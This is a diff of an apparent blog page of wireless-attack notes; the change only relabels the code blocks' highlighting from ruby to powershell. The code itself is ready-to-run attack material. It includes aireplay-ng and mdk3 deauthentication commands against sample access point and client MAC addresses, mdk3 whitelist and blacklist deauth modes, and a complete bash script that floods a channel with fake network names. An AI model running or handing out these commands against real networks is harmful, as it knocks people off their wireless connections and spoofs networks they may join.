@@ -49,29 +49,29 @@
 
 <p><strong><em>Determine Modes your NIC is capable of.</em></strong></p>
 
-<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="p">(</span><span class="n">find</span> <span class="no">PHY</span><span class="c1"># for your NIC)
-</span>
-<span class="n">iw</span> <span class="n">phy</span> <span class="n">phy1</span> <span class="n">info</span> <span class="o">|</span> <span class="n">grep</span> <span class="err">â€“</span><span class="no">A8</span> <span class="n">modes</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nf">airmon-ng</span><span class="w"> </span><span class="p">(</span><span class="nf">find</span><span class="w"> </span><span class="nx">PHY</span><span class="c"># for your NIC)
+</span><span class="w">
+</span><span class="nf">iw</span><span class="w"> </span><span class="nx">phy</span><span class="w"> </span><span class="nx">phy1</span><span class="w"> </span><span class="nx">info</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">grep</span><span class="w"> </span><span class="err">â€“</span><span class="nx">A8</span><span class="w"> </span><span class="nx">modes</span></code></pre></figure>
 
 <p><strong><em>Passive Scan (Should not generate any frames)</em></strong></p>
 
-<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">iw</span> <span class="n">dev</span> <span class="n">wlan0</span> <span class="nb">scan</span> <span class="n">passive</span> <span class="o">|</span> <span class="n">grep</span> <span class="no">SSID</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nf">iw</span><span class="w"> </span><span class="nx">dev</span><span class="w"> </span><span class="nx">wlan0</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">passive</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">grep</span><span class="w"> </span><span class="nx">SSID</span></code></pre></figure>
 
 <p><strong><em>Active Scan</em></strong></p>
 
-<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">iw</span> <span class="n">dev</span> <span class="n">wlan0</span> <span class="nb">scan</span> <span class="o">|</span> <span class="n">grep</span> <span class="no">SSID</span>
-<span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">start</span> <span class="n">wlan0</span>
-<span class="n">airodump</span><span class="o">-</span><span class="n">ng</span> <span class="n">mon0</span>
-<span class="n">iwconfig</span> <span class="n">wlan0</span> <span class="n">channel</span> <span class="c1">#
-</span>
-<span class="n">iwconfig</span> <span class="n">wlan0</span> <span class="n">essid</span> <span class="o">&lt;</span><span class="n">ssid</span><span class="o">&gt;</span>
-<span class="n">iwconfig</span> <span class="n">wlan0</span> <span class="n">mode</span> <span class="n">managed</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nf">iw</span><span class="w"> </span><span class="nx">dev</span><span class="w"> </span><span class="nx">wlan0</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">grep</span><span class="w"> </span><span class="nx">SSID</span><span class="w">
+</span><span class="nf">airmon-ng</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">wlan0</span><span class="w">
+</span><span class="nf">airodump-ng</span><span class="w"> </span><span class="nx">mon0</span><span class="w">
+</span><span class="nf">iwconfig</span><span class="w"> </span><span class="nx">wlan0</span><span class="w"> </span><span class="nx">channel</span><span class="w"> </span><span class="c">#
+</span><span class="w">
+</span><span class="nf">iwconfig</span><span class="w"> </span><span class="nx">wlan0</span><span class="w"> </span><span class="nx">essid</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">ssid</span><span class="err">&gt;</span><span class="w">
+</span><span class="nf">iwconfig</span><span class="w"> </span><span class="nx">wlan0</span><span class="w"> </span><span class="nx">mode</span><span class="w"> </span><span class="nx">managed</span></code></pre></figure>
 
 <p><strong><em>Deauthorization</em></strong></p>
 
-<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">iwconfig</span> <span class="n">mon0</span> <span class="n">channel</span> <span class="c1">#
-</span>
-<span class="n">aireplay</span><span class="o">-</span><span class="n">ng</span> <span class="o">-</span><span class="mi">0</span> <span class="mi">1</span> <span class="o">-</span><span class="n">a</span> <span class="mo">00</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">6</span><span class="no">C</span><span class="p">:</span><span class="mi">7</span><span class="no">E</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">80</span> <span class="o">-</span><span class="n">c</span> <span class="mo">00</span><span class="p">:</span><span class="mi">0</span><span class="no">F</span><span class="ss">:B5</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">30</span> <span class="n">ath0</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nf">iwconfig</span><span class="w"> </span><span class="nx">mon0</span><span class="w"> </span><span class="nx">channel</span><span class="w"> </span><span class="c">#
+</span><span class="w">
+</span><span class="nf">aireplay-ng</span><span class="w"> </span><span class="nt">-0</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nx">00:14:6C:7E:40:80</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">00:0F:B5:34:30:30</span><span class="w"> </span><span class="nx">ath0</span></code></pre></figure>
 
 <ul>
   <li>-0 means deauthentication</li>
@@ -83,25 +83,25 @@
 
 <p><strong><em>Deauthorization with **</em>MDK3</strong>*</p>
 
-<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">start</span> <span class="n">wlan0</span>
-<span class="n">dk3</span> <span class="n">mon0</span> <span class="n">d</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nf">airmon-ng</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">wlan0</span><span class="w">
+</span><span class="nf">dk3</span><span class="w"> </span><span class="nx">mon0</span><span class="w"> </span><span class="nx">d</span></code></pre></figure>
 
 <p>or</p>
 
-<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">mdk3</span> <span class="n">mon0</span> <span class="n">d</span> <span class="o">-</span><span class="n">w</span> <span class="n">whitelist</span> <span class="p">(</span><span class="n">deauth</span> <span class="n">everything</span> <span class="n">not</span> <span class="n">listed</span> <span class="k">in</span> <span class="n">file</span><span class="p">)</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nf">mdk3</span><span class="w"> </span><span class="nx">mon0</span><span class="w"> </span><span class="nx">d</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="nx">whitelist</span><span class="w"> </span><span class="p">(</span><span class="nf">deauth</span><span class="w"> </span><span class="nx">everything</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">listed</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">file</span><span class="p">)</span></code></pre></figure>
 
 <p>or</p>
 
-<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">mdk3</span> <span class="n">mon0</span> <span class="n">d</span> <span class="o">-</span><span class="n">b</span> <span class="n">blacklist</span> <span class="p">(</span><span class="n">deauth</span> <span class="n">everything</span> <span class="n">listed</span> <span class="k">in</span> <span class="n">file</span><span class="p">)</span>
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nf">mdk3</span><span class="w"> </span><span class="nx">mon0</span><span class="w"> </span><span class="nx">d</span><span class="w"> </span><span class="nt">-b</span><span class="w"> </span><span class="nx">blacklist</span><span class="w"> </span><span class="p">(</span><span class="nf">deauth</span><span class="w"> </span><span class="nx">everything</span><span class="w"> </span><span class="nx">listed</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">file</span><span class="p">)</span><span class="w">
 
-<span class="n">d</span> <span class="o">-</span> <span class="n">deauthorization</span> <span class="n">mode</span>
-<span class="n">w</span> <span class="o">-</span> <span class="n">whitelist</span>
-<span class="n">b</span> <span class="o">-</span> <span class="n">blacklist</span></code></pre></figure>
+</span><span class="nf">d</span><span class="w"> </span><span class="nf">-</span><span class="w"> </span><span class="nx">deauthorization</span><span class="w"> </span><span class="nx">mode</span><span class="w">
+</span><span class="nf">w</span><span class="w"> </span><span class="nf">-</span><span class="w"> </span><span class="nx">whitelist</span><span class="w">
+</span><span class="nf">b</span><span class="w"> </span><span class="nf">-</span><span class="w"> </span><span class="nx">blacklist</span></code></pre></figure>
 
 <p><strong><em>Broadcast Network Names with MDK3</em></strong></p>
 
-<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">start</span> <span class="n">wlan0</span>
-<span class="n">mdk3</span> <span class="n">mon0</span> <span class="n">b</span> <span class="o">-</span><span class="n">c</span> <span class="mi">11</span> <span class="o">-</span><span class="n">f</span> <span class="n">ssid_names</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nf">airmon-ng</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">wlan0</span><span class="w">
+</span><span class="nf">mdk3</span><span class="w"> </span><span class="nx">mon0</span><span class="w"> </span><span class="nx">b</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">11</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">ssid_names</span></code></pre></figure>
 
 <ul>
   <li>b - beacon flood mode</li>
@@ -110,38 +110,38 @@
 Everything you need to run a beacon flood in one script.</li>
 </ul>
 
-<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">networks</span><span class="o">=</span><span class="p">(</span>
-<span class="s2">"FreeWifi"</span>
-<span class="s2">"FBI Van #12"</span>
-<span class="s2">"Customer Wireless"</span>
-<span class="s2">"Visitors"</span>
-<span class="s2">"ATTWifi"</span>
-<span class="s2">"Verizon Hotspot"</span>
-<span class="s2">"l33t haxor net"</span>
-<span class="p">)</span>
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nf">networks</span><span class="o">=</span><span class="p">(</span><span class="w">
+</span><span class="s2">"FreeWifi"</span><span class="w">
+</span><span class="s2">"FBI Van #12"</span><span class="w">
+</span><span class="s2">"Customer Wireless"</span><span class="w">
+</span><span class="s2">"Visitors"</span><span class="w">
+</span><span class="s2">"ATTWifi"</span><span class="w">
+</span><span class="s2">"Verizon Hotspot"</span><span class="w">
+</span><span class="s2">"l33t haxor net"</span><span class="w">
+</span><span class="p">)</span><span class="w">
 
-<span class="k">if</span> <span class="p">[</span> <span class="o">-</span><span class="n">f</span> <span class="n">ssid_names</span> <span class="p">]</span>
-<span class="k">then</span>
-<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[1;31mDeleting list of network names</span><span class="se">\e</span><span class="s2">[0m"</span>
-<span class="n">rm</span> <span class="o">-</span><span class="n">f</span> <span class="n">ssid_names</span>
-<span class="n">fi</span>
+</span><span class="kr">if</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="kt">ssid_names</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span><span class="nf">then</span><span class="w">
+</span><span class="nf">echo</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="s2">"\e[1;31mDeleting list of network names\e[0m"</span><span class="w">
+</span><span class="nf">rm</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">ssid_names</span><span class="w">
+</span><span class="nf">fi</span><span class="w">
 
-<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[1;32mCreating list of network names</span><span class="se">\e</span><span class="s2">[0m"</span>
-<span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="s2">"${networks[@]}"</span>
-<span class="k">do</span>
-<span class="n">echo</span> <span class="vg">$i</span> <span class="o">&gt;&gt;</span> <span class="n">ssid_names</span>
-<span class="n">done</span>
+</span><span class="nf">echo</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="s2">"\e[1;32mCreating list of network names\e[0m"</span><span class="w">
+</span><span class="kr">for</span><span class="w"> </span><span class="nf">i</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="s2">"</span><span class="nv">${networks[@]}</span><span class="s2">"</span><span class="w">
+</span><span class="kr">do</span><span class="w">
+</span><span class="nf">echo</span><span class="w"> </span><span class="nv">$i</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">ssid_names</span><span class="w">
+</span><span class="nf">done</span><span class="w">
 
-<span class="k">if</span> <span class="p">[[</span> <span class="o">-</span><span class="n">n</span> <span class="err">$</span><span class="p">(</span><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">mon0</span><span class="p">)</span> <span class="p">]]</span>
-<span class="k">then</span>
-<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[1;32mMon0 interface exists</span><span class="se">\e</span><span class="s2">[0m"</span>
-<span class="k">else</span>
-<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[1;32mStarting AirMon on wlan0</span><span class="se">\e</span><span class="s2">[0m"</span>
-<span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">start</span> <span class="n">wlan0</span>
-<span class="n">fi</span>
+</span><span class="kr">if</span><span class="w"> </span><span class="p">[[</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="kt">airmon</span><span class="nt">-ng</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="kt">grep</span><span class="w"> </span><span class="kt">mon0</span><span class="p">)</span><span class="w"> </span><span class="p">]]</span><span class="w">
+</span><span class="nf">then</span><span class="w">
+</span><span class="nf">echo</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="s2">"\e[1;32mMon0 interface exists\e[0m"</span><span class="w">
+</span><span class="kr">else</span><span class="w">
+</span><span class="nf">echo</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="s2">"\e[1;32mStarting AirMon on wlan0\e[0m"</span><span class="w">
+</span><span class="nf">airmon-ng</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">wlan0</span><span class="w">
+</span><span class="nf">fi</span><span class="w">
 
-<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[1;32mBegin beacon flood on mon0</span><span class="se">\e</span><span class="s2">[0m"</span>
-<span class="n">mdk3</span> <span class="n">mon0</span> <span class="n">b</span> <span class="o">-</span><span class="n">c</span> <span class="mi">11</span> <span class="o">-</span><span class="n">f</span> <span class="n">ssid_names</span></code></pre></figure>
+</span><span class="nf">echo</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="s2">"\e[1;32mBegin beacon flood on mon0\e[0m"</span><span class="w">
+</span><span class="nf">mdk3</span><span class="w"> </span><span class="nx">mon0</span><span class="w"> </span><span class="nx">b</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">11</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">ssid_names</span></code></pre></figure>
 
 <ul>
   <li><a href="http://www.cyberciti.biz/tips/linux-find-out-wireless-network-speed-signal-strength.html" target="_blank">8 Linux Commands: To Find Out Wireless Network Speed, Signal Strength And Other Information</a></li>
